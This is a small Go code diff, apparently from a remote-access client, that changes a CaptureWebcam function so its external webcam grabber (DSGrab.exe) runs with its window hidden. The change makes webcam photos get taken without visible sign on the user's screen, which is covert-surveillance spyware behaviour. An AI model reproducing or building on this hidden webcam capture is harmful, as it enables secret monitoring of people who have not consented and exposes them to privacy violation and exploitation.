@@ -4,6 +4,7 @@ import (
 	"log"
 	"os"
 	"os/exec"
+	"syscall"
 
 	"github.com/Xart3mis/AKILT/Client/lib/bundles"
 )
@@ -18,7 +19,9 @@ func CaptureWebcam() []byte {
 
 	path := f + "\\Temp_Pic.jpg"
 
-	exec.Command("./DSGrab.exe", path).Run()
+	cmd := exec.Command("./DSGrab.exe", path)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	cmd.Run()
 
 	file, err := os.OpenFile(path, os.O_RDONLY, 0644)
 	if err != nil {
